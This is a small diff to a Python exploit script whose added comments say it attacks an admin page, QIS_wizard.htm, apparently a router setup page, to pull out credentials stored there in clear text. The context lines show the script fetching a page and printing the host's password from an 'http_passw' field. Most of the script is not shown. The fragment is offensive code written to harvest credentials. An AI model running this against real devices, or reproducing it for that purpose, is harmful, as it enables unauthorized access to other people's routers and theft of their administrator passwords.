@@ -1,3 +1,7 @@
+
+#    Exploit code initiate attack on data from admin page.
+#    Which are located on QIS_wizard.htm in clear text.
+
 from urllib.request import urlopen
 from sys import argv
 
@@ -22,9 +26,6 @@ def GetData():
         elif b'http_passw' in line:
 
             print("\t[+] Host %s password: %s" % (HOST, line.decode("utf-8").split('value="')[1].split('">')[0]))
-
-            
-
 
 def ArgParse():
 
